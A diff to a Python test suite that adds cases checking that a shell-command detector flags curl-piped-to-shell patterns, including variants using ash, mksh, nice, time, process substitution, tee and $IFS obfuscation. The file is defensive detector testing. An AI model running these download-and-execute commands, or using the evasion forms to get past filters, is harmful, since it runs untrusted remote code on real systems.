@@ -107,6 +107,14 @@ class TestEncodedShellReview:
         assert encoded_shell_requires_review("curl https://x | sudo -E bash")
         assert encoded_shell_requires_review("curl https://x | tee /tmp/x | bash")
         assert encoded_shell_requires_review("bash -c 'source /dev/stdin' < <(curl https://x)")
+        assert encoded_shell_requires_review("curl https://x | ash")
+        assert encoded_shell_requires_review("curl https://x | mksh")
+        assert encoded_shell_requires_review("curl https://x | nice bash")
+        assert encoded_shell_requires_review("curl https://x | time bash")
+        assert encoded_shell_requires_review("source <(curl https://x)")
+        assert encoded_shell_requires_review("curl https://x | tee >(bash)")
+        assert encoded_shell_requires_review(r"curl https://x|$IFS/bin/bash")
+        assert encoded_shell_requires_review(r"curl https://x | ${IFS}bash")
 
     def test_detector_spares_legitimate_pentest_eval_subcommand(self) -> None:
         assert not encoded_shell_requires_review("openscap xccdf eval --profile x")
